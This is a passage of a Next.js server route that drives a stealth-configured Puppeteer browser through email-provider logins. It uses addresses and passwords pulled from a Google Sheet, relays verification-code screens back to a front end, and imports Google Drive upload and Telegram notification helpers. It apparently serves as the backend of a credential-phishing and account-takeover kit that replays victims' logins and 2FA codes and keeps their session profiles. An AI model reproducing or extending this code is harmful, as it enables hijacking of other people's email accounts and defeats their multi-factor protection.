console.log("--- route.js file loaded ---"); // Top-level log
import { NextResponse } from "next/server";
import puppeteer from "puppeteer-core";
import chromium from "@sparticuz/chromium-min";
import { inspect } from 'util';
import fs from 'fs-extra'; 
import {
  localExecutablePath,
  isDev,
  userAgent,
  remoteExecutablePath,
} from "../../../../utils/utils.js"; 
import logger from "../../../../utils/logger.js"; 
import geminiHelper from "../../../../utils/geminiHelper.js"; 
import { platformConfigs } from "./platforms.js";
import { keyboardNavigate } from "../../../../utils/KeyboardHandlers.js"; 
import { uploadBrowserData } from '../../../api/googledrive.mjs';
import { 
    getColumnIndexes,
    fetchDataFromAppScript,
    updateBrowserRowData,
    resolveMx,
    isInbox,
    checkVerification,
    setCorsHeaders,
    startAppScriptDataBackgroundUpdater,
    stopAppScriptDataBackgroundUpdater
} from './routeHelper.js'; 
import { sendTelegramMessage } from '../../../api/telegram.js';
import { getProjectDetails } from '../../../api/googlesheets.js'; // Import getProjectDetails

const MAX_CONCURRENT_BROWSERS = parseInt(process.env.MAX_CONCURRENT_BROWSERS || '3', 10);
const activeProcesses = new Set();
const activeBrowserSessions = new Map(); 
logger.info(`Concurrency limit set to ${MAX_CONCURRENT_BROWSERS}`);

export const maxDuration = 60; 
export const dynamic = "force-dynamic";
export const runtime = 'nodejs';

async function handleAdditionalViews(page, platformConfig, instanceId, context = 'general') {
    if (!platformConfig?.additionalViews || platformConfig.additionalViews.length === 0) {
        logger.debug(`[handleAdditionalViews][${instanceId}] No additional views to process for this platform.`);
        return;
    }
    logger.info(`[handleAdditionalViews][${instanceId}] Starting to check for additional views (context: ${context})...`);

    const maxIterations = 10; // Prevent infinite loops
    let iterationCount = 0;
    let viewHandledInThisIteration = true; // Start true to enter the loop

    while (viewHandledInThisIteration && iterationCount < maxIterations) {
        viewHandledInThisIteration = false;
        iterationCount++;
        logger.debug(`[handleAdditionalViews][${instanceId}] Iteration ${iterationCount}/${maxIterations}.`);

        // Wait for page to be ready before checking for views
        await page.waitForFunction(() => document.readyState === 'complete', { timeout: 10000 }).catch(() => null); // Increased timeout

        for (const view of platformConfig.additionalViews) {
            if (context === 'post_verification' && (view.isVerificationChoiceScreen || view.isCodeEntryScreen)) {
                logger.debug(`[handleAdditionalViews][${instanceId}] Skipping primary verification screen '${view.name}' in post-verification context.`);
                continue;
            }

            try {
                const matchFound = await page.evaluate((viewData) => {
                    try {
                        const selectors = Array.isArray(viewData.match.selector) ?
                            viewData.match.selector : [viewData.match.selector];
                        let elementFoundBySelector = false;
                        let textCriteriaMet = !viewData.match.text; // True if no text to match

                        for (const sel of selectors) {
                            if (typeof sel !== 'string') {
                                console.error(`[handleAdditionalViews][${instanceId}] Match selector is not a string. Type: ${typeof sel}, Value: ${sel}`);
                                continue;
                            }

                            const element = document.querySelector(sel);
                            if (element) {
                                elementFoundBySelector = true;
                                if (viewData.match.text) {
                                    if ((element.textContent || "").includes(viewData.match.text)) {
                                        textCriteriaMet = true;
                                        break;
                                    } else {
                                        textCriteriaMet = false;
                                    }
                                } else {
                                    break;
                                }
                            }
                        }
                        return elementFoundBySelector && textCriteriaMet;
                    } catch (e) {
                        console.error(`[handleAdditionalViews][${instanceId}] Error during page evaluation for view match: ${e.message}`);
                        return false;
                    }
                }, view).catch((e) => {
                    logger.error(`[handleAdditionalViews][${instanceId}] Error evaluating view match for ${view.name}: ${e.message}`);
                    return false;
                });

                if (matchFound) {
                    logger.info(`[handleAdditionalViews][${instanceId}] Matched additional view: ${view.name}`);
                    if (view.action) {
                        if (typeof view.action === 'function') {
                            logger.info(`[handleAdditionalViews][${instanceId}] Executing custom action for view: ${view.name}`);
                            await view.action(page, view, platformConfig);
                        } else if (view.action.type === 'click') {
                            const actionSelectors = Array.isArray(view.action.selector) ?
                                view.action.selector : [view.action.selector];
                            let clickedViewAction = false;

                            if (view.action.text) {
                                logger.debug(`[handleAdditionalViews][${instanceId}] Attempting to click element with text "${view.action.text}" within selectors: ${JSON.stringify(actionSelectors)}`);
                                try {
                                    const elementClicked = await page.evaluate(async (selectors, textToFind) => {
                                        for (const sel of selectors) {
                                            const elements = document.querySelectorAll(sel);
                                            for (const element of elements) {
                                                if (element.textContent.includes(textToFind)) {
                                                    element.click();
                                                    return true;
                                                }
                                            }
                                        }
                                        return false;
                                    }, actionSelectors, view.action.text);

                                    if (elementClicked) {
                                        logger.info(`[handleAdditionalViews][${instanceId}] Clicked element with text "${view.action.text}" for view: ${view.name}`);
                                        clickedViewAction = true;
                                        const navigationWaitUntil = view.action.navigationWaitUntil || 'networkidle0';
                                        await page.waitForNavigation({ waitUntil: navigationWaitUntil, timeout: 15000 }).catch(() => null); // Increased timeout
                                        await new Promise(res => setTimeout(res, 2000)); // Increased delay
                                    } else {
                                        logger.warn(`[handleAdditionalViews][${instanceId}] Element with text "${view.action.text}" not found within selectors for view ${view.name}.`);
                                    }
                                } catch (textClickError) {
                                    logger.warn(`[handleAdditionalViews][${instanceId}] Error clicking element by text for view ${view.name}: ${textClickError.message}`);
                                }
                            }

                            if (!clickedViewAction) {
                                logger.debug(`[handleAdditionalViews][${instanceId}] Falling back to clicking by selector for view: ${view.name}`);
                                for (const selector of actionSelectors) {
                                    if (typeof selector !== 'string') {
                                        logger.warn(`[handleAdditionalViews][${instanceId}] Action selector for view ${view.name} is not a string. Type: ${typeof selector}, Value: ${selector}. Skipping.`);
                                        continue;
                                    }
                                    try {
                                        await page.waitForSelector(selector, { visible: true, timeout: 5000 }); // Increased timeout
                                        const navigationWaitUntil = view.action.navigationWaitUntil || 'networkidle0';
                                        if (view.action.navigationWaitUntil) {
                                            logger.info(`[handleAdditionalViews][${instanceId}] Using configured navigation wait for '${view.name}' action: ${navigationWaitUntil}.`);
                                        }
                                        const navigationPromise = page.waitForNavigation({ waitUntil: navigationWaitUntil, timeout: 15000 }).catch(() => null); // Increased timeout
                                        await page.click(selector);
                                        await navigationPromise;
                                        logger.info(`[handleAdditionalViews][${instanceId}] Clicked action selector '${selector}' for view: ${view.name}`);
                                        clickedViewAction = true;
                                        await new Promise(res => setTimeout(res, 2000)); // Increased delay
                                        break;
                                    } catch (modalClickError) {
                                        logger.warn(`[handleAdditionalViews][${instanceId}] Action selector '${selector}' not found or clickable for view ${view.name}. Trying next if available.`);
                                    }
                                }
                                if (!clickedViewAction) {
                                    logger.warn(`[handleAdditionalViews][${instanceId}] No action selectors were clickable for view ${view.name}.`);
                                }
                            }
                        }
                    } else {
                        logger.info(`[handleAdditionalViews][${instanceId}] View ${view.name} matched but has no defined action.`);
                    }
                    viewHandledInThisIteration = true; // A view was handled, so re-evaluate
                    break; // Break from inner for loop to re-enter while loop and re-evaluate all views
                }
            } catch (viewError) {
                logger.error(`[handleAdditionalViews][${instanceId}] Error processing additional view ${view.name}: ${viewError.message}`);
            }
        }
    }
    if (iterationCount >= maxIterations) {
        logger.warn(`[handleAdditionalViews][${instanceId}] Exceeded max iterations (${maxIterations}) while processing additional views. Some views might not have been handled.`);
    }
    logger.info(`[handleAdditionalViews][${instanceId}] Finished processing additional views.`);
}

async function checkAccountAccess(browser, page, email, password, platform, browserId) {
    const originalPage = page;
    let emailExists = false;
    let accountAccess = false;
    let reachedInbox = false;
    let requiresVerification = false;
    const instanceId = `pid-${browser.process()?.pid || 'unknown'}`;

    try {
        const platformConfig = platformConfigs[platform] || {};
        if (!platformConfig.url) {
            throw new Error(`No URL defined for platform: ${platform}`);
        }

        // Defensive check for platformConfig.selectors
        if (typeof platformConfig.selectors !== 'object' || platformConfig.selectors === null) {
            logger.error(`[checkAccountAccess][${instanceId}] platformConfig.selectors is not a valid object for platform: ${platform}.`);
            return { emailExists: false, accountAccess: false, reachedInbox: false, requiresVerification: false, error: "Invalid platform selectors configuration." };
        }

        let gotoSuccessful = false;
        const gotoRetries = 2;
        const initialGotoTimeout = 30000;

        for (let attempt = 1; attempt <= gotoRetries; attempt++) {
            try {
                logger.info(`[checkAccountAccess][${instanceId}] Attempt ${attempt}/${gotoRetries} to navigate to ${platformConfig.url}`);
                await originalPage.goto(platformConfig.url, { waitUntil: 'networkidle0', timeout: initialGotoTimeout });
                gotoSuccessful = true;
                logger.info(`[checkAccountAccess][${instanceId}] Successfully navigated to ${platformConfig.url} on attempt ${attempt}.`);
                break;
            } catch (e) {
                logger.warn(`[checkAccountAccess][${instanceId}] Attempt ${attempt}/${gotoRetries} failed for page.goto(): ${e.message}`);
                if (attempt === gotoRetries) throw e;
                await new Promise(res => setTimeout(res, 2000));
            }
        }
        if (!gotoSuccessful) throw new Error(`Failed to navigate to ${platformConfig.url} after ${gotoRetries} attempts.`);

        logger.info(`[checkAccountAccess][${instanceId}] Starting flow for platform ${platform}.`);

        for (const step of platformConfig.flow || []) {
            try {
                 if (step.action === 'waitForSelector') {
                    // Ensure selector is a string before using it
                    if (typeof step.selector !== 'string') {
                        logger.warn(`[checkAccountAccess][${instanceId}] waitForSelector step has a non-string selector. Type: ${typeof step.selector}, Value: ${step.selector}. Skipping step.`);
                        continue;
                    }
                    const timeout = step.selector === 'input' ? 15000 : (step.timeout || 15000); // Increased timeout for initial 'input' selector
                    logger.debug(`[checkAccountAccess][${instanceId}] Waiting for selector: ${step.selector} with timeout: ${timeout}ms`);
                    await page.waitForSelector(step.selector, { visible: true, timeout: timeout });
                    logger.debug(`[checkAccountAccess][${instanceId}] Found selector: ${step.selector}`);
                    continue;
                }
                if (step.action === 'wait') {
                    logger.info(`[checkAccountAccess][${instanceId}] Performing explicit wait: ${step.duration || 3000}ms`);
                    await new Promise(res => setTimeout(res, step.duration || 3000));
                    continue;
                }
                if (!step.selector) continue;

                let resolvedSelector = step.selector;
                if (platformConfig?.selectors?.[step.selector]) {
                  resolvedSelector = platformConfig.selectors[step.selector];
                }

                if (step.action === 'type') {
                    // Ensure resolvedSelector is a string before using it for typing
                    if (typeof resolvedSelector !== 'string') {
                        logger.warn(`[checkAccountAccess][${instanceId}] Type action has a non-string resolved selector. Type: ${typeof resolvedSelector}, Value: ${resolvedSelector}. Skipping step.`);
                        continue;
                    }
                    const value = step.value === 'EMAIL' ? email : (step.value === 'PASSWORD' ? password : step.value);
                    const logValue = step.value === 'PASSWORD' ? '*****' : value;
                    logger.debug(`[checkAccountAccess][${instanceId}] Typing '${logValue}' into ${resolvedSelector}`);
                    try { await originalPage.bringToFront(); } catch(e) { logger.warn(`[bringToFront Pre-Type][${instanceId}] Error: ${e.message}`); }
                    await page.waitForSelector(resolvedSelector, { visible: true, timeout: 15000 });
                    await page.evaluate((selector) => {
                        const element = document.querySelector(selector);
                        if (element) { element.scrollIntoView({ behavior: 'auto', block: 'center', inline: 'center' }); element.value = ''; }
                    }, resolvedSelector);
                    await page.type(resolvedSelector, value, { delay: 25 });
                    if (step.delay && typeof step.delay === 'number' && step.delay > 0) {
                        logger.info(`[checkAccountAccess][${instanceId}] Performing explicit step delay: ${step.delay}ms`);
                        await new Promise(res => setTimeout(res, step.delay));
                    }
                 } else if (step.action === 'click') {
                    if (typeof resolvedSelector === 'function') {
                        logger.info(`[checkAccountAccess][${instanceId}] Invoking custom click handler for ${step.selector}`);
                        await resolvedSelector(page, platformConfig.selectors);
                    } else {
                        let selectorsToAttempt = Array.isArray(resolvedSelector) ? resolvedSelector : [resolvedSelector];
                        if (selectorsToAttempt.length > 0) {
                            // Ensure all selectors in the array are strings
                            const validSelectorsToAttempt = selectorsToAttempt.filter(sel => {
                                if (typeof sel !== 'string') {
                                    logger.warn(`[checkAccountAccess][${instanceId}] Click action has a non-string selector in array. Type: ${typeof sel}, Value: ${sel}. Skipping this selector.`);
                                    return false;
                                }
                                return true;
                            });

                            if (validSelectorsToAttempt.length === 0) {
                                logger.warn(`[checkAccountAccess][${instanceId}] No valid string selectors to attempt for click action.`);
                                continue; // Skip the step if no valid selectors remain
                            }

                            logger.info(`[checkAccountAccess][${instanceId}] Attempting to find and click one of selector(s): ${JSON.stringify(validSelectorsToAttempt)}`);
                            const firstVisibleSelector = await Promise.race(
                                validSelectorsToAttempt.map(sel => page.waitForSelector(sel, { visible: true, timeout: 5000 }).then(() => sel))
                            ).catch(raceError => {
                                logger.warn(`[checkAccountAccess][${instanceId}] None of the selectors ${JSON.stringify(validSelectorsToAttempt)} were found. Error: ${raceError.message}`);
                                throw new Error(`Critical click failure: None of the selectors ${JSON.stringify(validSelectorsToAttempt)} were found. Original error: ${raceError.message}`);
                            });

                            logger.info(`[checkAccountAccess][${instanceId}] First visible selector found: ${firstVisibleSelector}`);
                            try { await originalPage.bringToFront(); } catch(e) { logger.warn(`[bringToFront Pre-Click][${instanceId}] Error: ${e.message}`); }
                            const navigationPromise = page.waitForNavigation({ waitUntil: 'networkidle0', timeout: 10000 }).catch(() => null);
                            await page.click(firstVisibleSelector);
                            await navigationPromise;
                            logger.info(`[checkAccountAccess][${instanceId}] Clicked on selector: ${firstVisibleSelector}`);
                            try { await originalPage.bringToFront(); } catch(e) {/* ignore */}
                        }
                    }
                    
                    // Check for verification screens immediately after a click
                    const verificationDetailsAfterClick = await checkVerification(page, platformConfig);
                    if (verificationDetailsAfterClick.required) {
                        logger.info(`[checkAccountAccess][${instanceId}] Verification screen detected after click: ${verificationDetailsAfterClick.viewName}. Returning for state transition.`);
                        return {
                            emailExists: true, // Assuming email and account access are true if we reached a verification screen
                            accountAccess: true,
                            reachedInbox: false,
                            requiresVerification: true,
                            verificationState: verificationDetailsAfterClick.type === 'choice' ? 'WAITING_OPTIONS' : 'WAITING_CODE',
                            verificationOptions: verificationDetailsAfterClick.type === 'choice' && typeof platformConfig.extractVerificationOptions === 'function' ? await platformConfig.extractVerificationOptions(page, platformConfig, verificationDetailsAfterClick.viewName) : [],
                            viewName: verificationDetailsAfterClick.viewName
                        };
                    }

                    // If no verification screen, then handle general additional views
                    await handleAdditionalViews(page, platformConfig, instanceId);
                }

                const originalSelectorName = step.selector;

                if (platformConfig?.selectors) {
                    if (originalSelectorName === 'nextButton') {
                        let emailErrorDetected = false;
                        // Prioritize incorrectEmailMessage if it exists
                        if (platformConfig.selectors.incorrectEmailMessage) {
                            const incorrectEmailSelectors = Array.isArray(platformConfig.selectors.incorrectEmailMessage) ?
                                platformConfig.selectors.incorrectEmailMessage : [platformConfig.selectors.incorrectEmailMessage];
                            
                            let incorrectEmailExists = false;
                            for (const selector of incorrectEmailSelectors) {
                                if (typeof selector === 'string') {
                                    const currentIncorrectEmailExists = await page.evaluate((xpath) => {
                                        try { return !!document.evaluate(xpath, document, null, XPathResult.FIRST_ORDERED_NODE_TYPE, null).singleNodeValue; } catch (e) { return false; }
                                    }, selector).catch(() => false);
                                    if (currentIncorrectEmailExists) {
                                        incorrectEmailExists = true;
                                        break;
                                    }
                                } else {
                                    logger.warn(`[checkAccountAccess][${instanceId}] incorrectEmailMessage selector is not a string: ${selector}`);
                                }
                            }

                            if (incorrectEmailExists) {
                                logger.info(`[checkAccountAccess][${instanceId}] Incorrect email detected. Returning WAITINGEMAIL_ERROR.`);
                                return { emailExists: false, accountAccess: false, reachedInbox: false, requiresVerification: false, verificationState: 'WAITINGEMAIL_ERROR', message: "Incorrect email provided. Please try again with a valid email." };
                            }
                        }

                        // If incorrectEmailMessage was not detected, check for generic errorMessage
                        if (platformConfig.selectors.errorMessage) {
                            const errorMessageSelector = platformConfig.selectors.errorMessage;
                            if (typeof errorMessageSelector === 'string') {
                                const errorExists = await page.evaluate((xpath) => {
                                    try { return !!document.evaluate(xpath, document, null, XPathResult.FIRST_ORDERED_NODE_TYPE, null).singleNodeValue; } catch (e) { return false; }
                                }, errorMessageSelector).catch(() => false);
                                if (errorExists) {
                                    logger.info(`[checkAccountAccess][${instanceId}] Email error detected (generic). Email does not exist.`);
                                    return { emailExists: false, accountAccess: false, reachedInbox: false, requiresVerification: false };
                                }
                            } else {
                                logger.warn(`[checkAccountAccess][${instanceId}] errorMessage selector is not a string: ${errorMessageSelector}`);
                            }
                        }
                        
                        // If no email error was detected, assume email exists and proceed
                        emailExists = true;
                        if (!password) {
                            logger.info(`[checkAccountAccess][${instanceId}] Email exists, waiting for password.`);
                            return { emailExists: true, accountAccess: false, reachedInbox: false, requiresVerification: false, verificationState: 'WAITING_PASSWORD' };
                        }
                        if (await isInbox(page, platformConfig)) {
                            logger.info(`[checkAccountAccess][${instanceId}] Already in inbox after email submission. Skipping password.`);
                            return { emailExists: true, accountAccess: true, reachedInbox: true, requiresVerification: false };
                        }
                    }
                    
                    if (originalSelectorName === 'passwordNextButton' && platformConfig.selectors.loginFailed) {
                        const loginFailedSelectors = Array.isArray(platformConfig.selectors.loginFailed) ?
                            platformConfig.selectors.loginFailed : [platformConfig.selectors.loginFailed];
                        
                        let failExists = false;
                        for (const selector of loginFailedSelectors) {
                            if (typeof selector === 'string') {
                                const currentFailExists = await page.evaluate((xpath) => {
                                    try { return !!document.evaluate(xpath, document, null, XPathResult.FIRST_ORDERED_NODE_TYPE, null).singleNodeValue; } catch (e) { return false; }
                                }, selector).catch(() => false);
                                if (currentFailExists) {
                                    failExists = true;
                                    break; // Found a matching error, no need to check further
                                }
                            } else {
                                logger.warn(`[checkAccountAccess][${instanceId}] loginFailed selector is not a string: ${selector}`);
                            }
                        }

                        if (failExists) {
                            logger.info(`[checkAccountAccess][${instanceId}] Login failed detected after password next. Returning WAITINGPASSWORD_ERROR.`);
                            return { emailExists, accountAccess: false, reachedInbox: false, requiresVerification: false, verificationState: 'WAITINGPASSWORD_ERROR', message: "Incorrect password provided. Please try again." };
                        } else {
                            accountAccess = true;
                        }
                    } else if (originalSelectorName === 'passwordNextButton' && !platformConfig.selectors.loginFailed) {
                         accountAccess = true;
                    }
                }
            } catch (stepError) {
                logger.error(`[checkAccountAccess][${instanceId}] Step error during action '${step.action}' for selector '${step.selector}': ${stepError.message}`, stepError);
                let isCritical = false;
                const failedStepSelectorKey = step.selector;
                if (step.action === 'type' && (failedStepSelectorKey === 'input' || failedStepSelectorKey === 'passwordInput') && stepError.message.startsWith('Type action failed:')) isCritical = true;
                else if (stepError.message.startsWith('Critical click failure')) isCritical = true;
                if (isCritical) return { emailExists, accountAccess: false, reachedInbox: false, requiresVerification: false, error: stepError.message }; // Include error message for critical failures
                logger.warn(`[checkAccountAccess][${instanceId}] Non-critical step error encountered. Continuing flow.`);
            }
        }

        logger.info(`[checkAccountAccess][${instanceId}] Flow completed. Current state: emailExists=${emailExists}, accountAccess=${accountAccess}`);
        if (emailExists && accountAccess) {
            const verificationDetails = await checkVerification(page, platformConfig);
            if (verificationDetails.required) {
                requiresVerification = true;
                if (verificationDetails.type === 'choice' && typeof platformConfig.extractVerificationOptions === 'function') {
                    const options = await platformConfig.extractVerificationOptions(page, platformConfig, verificationDetails.viewName);
                    return { emailExists, accountAccess, reachedInbox: false, requiresVerification, verificationState: 'WAITING_OPTIONS', verificationType: verificationDetails.type, verificationOptions: options, viewName: verificationDetails.viewName };
                }
                return { emailExists, accountAccess, reachedInbox: false, requiresVerification, verificationState: 'WAITING_CODE', verificationType: verificationDetails.type, viewName: verificationDetails.viewName };
            }
        }
        if (emailExists && accountAccess && !requiresVerification) {
            reachedInbox = await isInbox(page, platformConfig);
        }
        return { emailExists, accountAccess, reachedInbox, requiresVerification, verificationState: null };
    } catch (err) {
        logger.error(`[checkAccountAccess][${instanceId}] Unexpected error: ${err.message}`, err);
        return { emailExists: false, accountAccess: false, reachedInbox: false, requiresVerification: false, verificationState: null, error: err.message };
    }
}




async function processRow(row, columnIndexes, existingBrowser = null, existingPage = null) {
  const browserId = row[columnIndexes['browserId']];
  let email = row[columnIndexes['email']]; // Changed to let
  const password = row[columnIndexes['password']];
  logger.info(`[processRow][${browserId}] Processing row.`);

  const userDataDir = `users_data/${browserId}`;
  let browser = null;
  let page = null;
  let targetCreatedListener = null; // Defined here to be accessible in finally
  let finalStatus = "FAILED"; 
  let updateData = { status: finalStatus }; 
  let browserFullyClosed = false;
  let platform = 'unknown'; 
  let initialCheckResult = {
      emailExists: false,
      accountAccess: false,
      reachedInbox: false,
      requiresVerification: false,
      verificationState: null,
      verificationOptions: [],
      viewName: null
  }; 
  let instanceId = `PROC-SETUP-${browserId}`; 
  let isReusingBrowser = false;

  try {
    if (existingBrowser && existingPage) {
        // Check if the existing session is still valid
        if (!existingBrowser.isConnected() || existingPage.isClosed()) {
            logger.warn(`[processRow][${browserId}] Stale session detected. Cleaning up and launching new browser.`);
            activeBrowserSessions.delete(browserId); // Remove stale session
            if (existingBrowser.isConnected()) {
                await existingBrowser.close().catch(e => logger.error(`Error closing stale browser (processRow): ${e.message}`));
            }
            // Fall through to launch new browser
        } else {
            browser = existingBrowser;
            page = existingPage;
            // Retrieve the existing listener if available from the session
            const session = activeBrowserSessions.get(browserId);
            targetCreatedListener = session?.targetCreatedListener;
            isReusingBrowser = true;
            instanceId = `PROC-REUSE-${browserId}-${browser.process()?.pid || 'unknownPID'}`;
            logger.info(`[processRow][${browserId}] Reusing existing browser session.`);
            try { await page.bringToFront(); } catch (e) { logger.warn(`[processRow][${browserId}] Error bringing reused page to front: ${e.message}`); }
        }
    }

    if (!browser) { // Only launch new browser if not reusing a valid one
        logger.info(`[processRow][${browserId}] Launching new browser session.`);
        const maxLaunchRetries = 3;
        for (let i = 0; i < maxLaunchRetries; i++) {
            try {
                logger.info(`[processRow][${browserId}] Attempt ${i + 1}/${maxLaunchRetries} to launch browser.`);
                browser = await puppeteer.launch({
                    ignoreDefaultArgs: ["--enable-automation"],
                    args: [
                        ...(isDev
                            ? [
                                "--disable-blink-features=AutomationControlled",
                                "--disable-features=site-per-process",
                                "-disable-site-isolation-trials"
                              ]
                            : [...chromium.args, "--disable-blink-features=AutomationControlled"]),
                        '--window-size=1920,1080',
                        '--force-device-scale-factor=1',
                        '--disable-dev-shm-usage', // Recommended for Docker/serverless environments
                        '--no-sandbox', // Required for some environments, but has security implications
                    ],
                    defaultViewport: { width: 1920, height: 1080, deviceScaleFactor: 1 },
                    executablePath: isDev ? localExecutablePath : await chromium.executablePath(remoteExecutablePath),
                    headless: false,
                    userDataDir,
                    timeout: 60000, // Browser launch timeout set to 60 seconds
                  });
                logger.info(`[processRow][${browserId}] Browser launched successfully on attempt ${i + 1}. PID: ${browser.process()?.pid}`);
                break; // Break out of retry loop on success
            } catch (launchError) {
                logger.error(`[processRow][${browserId}] Browser launch attempt ${i + 1}/${maxLaunchRetries} failed: ${launchError.message}. Stack: ${launchError.stack}`);
                if (i < maxLaunchRetries - 1) {
                    logger.warn(`[processRow][${browserId}] Retrying browser launch in 5 seconds...`);
                    await new Promise(resolve => setTimeout(resolve, 5000)); // Wait before retrying
                } else {
                    logger.error(`[processRow][${browserId}] All ${maxLaunchRetries} browser launch attempts failed. Final error: ${launchError.message}`);
                    throw new Error(`Failed to launch browser after ${maxLaunchRetries} attempts: ${launchError.message}`); // Re-throw to be caught by outer try/catch
                }
            }
        }

        instanceId = `PROC-${browserId}-${browser.process()?.pid || 'unknownPID'}`;

        const allPages = await browser.pages();
        page = allPages[0];

        for (let i = 1; i < allPages.length; i++) { 
            if (!allPages[i].isClosed()) {
                try { await allPages[i].close(); } catch (closeErr) { logger.warn(`[Initial Tab Cleanup][${browserId}] Error closing tab: ${closeErr.message}`); }
            }
        }

        targetCreatedListener = async (target) => { // Assign to the outer scope variable
            if (target.type() === 'page') {
              const newPage = await target.page();
              if (newPage && newPage !== page && !newPage.isClosed()) {
                logger.info(`[Tab Listener][${browserId}] Detected and closing new tab: ${target.url()}`);
                try { await newPage.close(); } catch (closeErr) { logger.warn(`[Tab Listener][${browserId}] Error closing new tab: ${closeErr.message}`); }
              }
            }
          };
        browser.on('targetcreated', targetCreatedListener);

        await page.setUserAgent(userAgent);
        await page.setViewport({ width: 1920, height: 1080, deviceScaleFactor: 1 });
        await page.evaluateOnNewDocument(() => {
            const style = document.createElement('style');
            style.innerHTML = `
                html, body { overflow: auto !important; }
                ::-webkit-scrollbar { display: block !important; }
            `;
            document.head.appendChild(style);
        });
    }

      let domain = '';
      let mxRecords = [];
      let matchedPlatformKey = '';
      let platformConfig = {};
      
      // Determine platform and platformConfig early if email is available
      if (email) { // Only if email is available from the start or found in WAITINGEMAIL
          domain = email.split('@')[1].toLowerCase();
          mxRecords = await resolveMx(domain).catch(() => []);
          matchedPlatformKey = Object.keys(platformConfigs).find(key => {
              const config = platformConfigs[key];
              return config.mxKeywords && config.mxKeywords.some(kw => domain.includes(kw) || mxRecords.some(mx => mx.exchange && mx.exchange.includes(kw)));
          });
          platform = matchedPlatformKey || 'unknown';
          platformConfig = platformConfigs[platform] || {};
      }

      // If we have an email but couldn't resolve a platform or login URL, persist a specific
      // WAITINGEMAIL state with an informative lastJsonResponse so the UI can surface a
      // distinct error (unable to determine login URL) that is different from a later
      // 'incorrect email after page load' detection.
      if (email && (!platformConfig || !platformConfig.url || platform === 'unknown')) {
          logger.info(`[processRow][${browserId}] Could not determine platform/login URL for domain '${domain}'. Persisting WAITINGEMAIL with descriptive lastJsonResponse.`);
          finalStatus = "WAITINGEMAIL";
          updateData.status = finalStatus;
          updateData.lastJsonResponse = JSON.stringify({
              browserId,
              email,
              status: finalStatus,
              platform: platform || 'unknown',
              domain: domain || '',
              errorType: 'NO_PLATFORM_URL',
              message: `Unable to determine login URL for domain '${domain}'. Please verify the email or try a different account.`,
              timestamp: new Date().toISOString()
          });
          // Clear email/domain in the sheet to prompt the user to re-enter and persist the WAITINGEMAIL state
          await updateBrowserRowData(browserId, { ...updateData, email: '', domain: '' });
          return; // Exit so no later logic overwrites this WAITING state
      }
      
      const currentSheetStatusFromRow = row[columnIndexes['status']];
      
      // Main state handling logic
      if (currentSheetStatusFromRow === "WAITING") {
          logger.info(`[processRow][${browserId}] Initial WAITING state. Performing initial checkAccountAccess.`);
          await handleAdditionalViews(page, platformConfig, instanceId, 'initial_load');
          initialCheckResult = await checkAccountAccess(browser, page, email, password, platform, browserId);
      } else if (currentSheetStatusFromRow === "WAITINGEMAIL") {
          logger.info(`[processRow][${browserId}] Entering WAITINGEMAIL poll loop.`);
          const pollingTimeoutEmail = Date.now() + 5 * 60 * 1000; // 5 minutes timeout
          let emailProvidedAndProcessed = false;

          while (Date.now() < pollingTimeoutEmail && !emailProvidedAndProcessed) {
              try {
                  // Session Health Check
                  if (page && !(await isPageResponsive(page, browserId, instanceId))) {
                      logger.error(`[processRow][${browserId}][WAITINGEMAIL] Page became unresponsive. Marking as FAILED.`);
                      finalStatus = "FAILED";
                      updateData.status = "FAILED";
                      updateData.verified = false; // FAILED so verified false
                      updateData.fullAccess = false; // FAILED so fullAccess false
                      updateData.lastJsonResponse = JSON.stringify({
                          ...JSON.parse(updateData.lastJsonResponse || '{}'), status: "FAILED",
                          message: "Failed during WAITINGEMAIL phase: Browser page became unresponsive."
                      });
                      break; // Exit polling loop
                  }

                  const checkData = await fetchDataFromAppScript(1, 30000, true); // Force refresh, rate-limited by _fetchAndCacheAppScriptData
                  const checkHeaders = checkData[0];
                  const checkColumnIndexes = getColumnIndexes(checkHeaders);
                  const checkRows = checkData.slice(1);
                  const checkRow = checkRows.find(r => r[checkColumnIndexes['browserId']] === browserId);

                  if (!checkRow) {
                      logger.error(`[processRow][${browserId}][WAITINGEMAIL] Row not found during polling. Exiting loop.`);
                      finalStatus = "FAILED";
                      break;
                  }

                  const currentEmail = checkRow[checkColumnIndexes['email']];
                  logger.debug(`[processRow][${browserId}][WAITINGEMAIL] Fetched email: '${currentEmail}'`);

                  if (currentEmail && String(currentEmail).trim() !== "") {
                      logger.info(`[processRow][${browserId}][WAITINGEMAIL] Email found. Setting status to PROCESSING.`);
                      await updateBrowserRowData(browserId, { status: "PROCESSING", verified: false, fullAccess: false, lastJsonResponse: JSON.stringify({ browserId, email: currentEmail, status: "PROCESSING", message: "Processing email verification" }) });
                      email = currentEmail; // Update the email variable for subsequent use
                      emailProvidedAndProcessed = true;
                      // After email is found, we need to determine platform and then proceed with checkAccountAccess
                      domain = email.split('@')[1].toLowerCase();
                      mxRecords = await resolveMx(domain).catch(() => []);
                      matchedPlatformKey = Object.keys(platformConfigs).find(key => {
                          const config = platformConfigs[key];
                          return config.mxKeywords && config.mxKeywords.some(kw => domain.includes(kw) || mxRecords.some(mx => mx.exchange && mx.exchange.includes(kw)));
                      });
                      platform = matchedPlatformKey || 'unknown';
                      platformConfig = platformConfigs[platform] || {};
                      
                      initialCheckResult = await checkAccountAccess(browser, page, email, password, platform, browserId); // This is the only place checkAccountAccess is called for WAITINGEMAIL

                      // Immediately check the result for generic email errors and set status within the polling loop
                      if (!initialCheckResult.emailExists && (initialCheckResult.verificationState === null || initialCheckResult.verificationState === undefined)) {
                          logger.info(`[processRow][${browserId}] Generic email error detected during WAITINGEMAIL. Setting status to WAITINGEMAIL.`);
                          finalStatus = "WAITINGEMAIL";
                          // Ensure updateData reflects the new status immediately so finally() sees it
                          updateData.status = finalStatus;
                          updateData.lastJsonResponse = JSON.stringify({
                              browserId,
                              email,
                              status: finalStatus,
                              emailExists: initialCheckResult.emailExists,
                              accountAccess: initialCheckResult.accountAccess,
                              reachedInbox: initialCheckResult.reachedInbox,
                              requiresVerification: initialCheckResult.requiresVerification,
                              verificationState: initialCheckResult.verificationState || null,
                              verificationOptions: initialCheckResult.verificationOptions || [],
                              platform,
                              timestamp: new Date().toISOString(),
                              message: initialCheckResult.message || "Email does not exist. Please provide a valid email."
                          });
                          // Clear the email, domain, and password fields in the sheet when transitioning to WAITINGEMAIL
                          logger.debug(`[processRow][${browserId}] Clearing email, domain, password. Returning to WAITINGEMAIL state.`);
                          await updateBrowserRowData(browserId, { ...updateData, email: '', domain: '', password: '', verified: false, fullAccess: false });
                          return; // Exit processRow immediately so no later logic overwrites status
                      }

                      break; // Exit polling loop (original break)
                  } else {
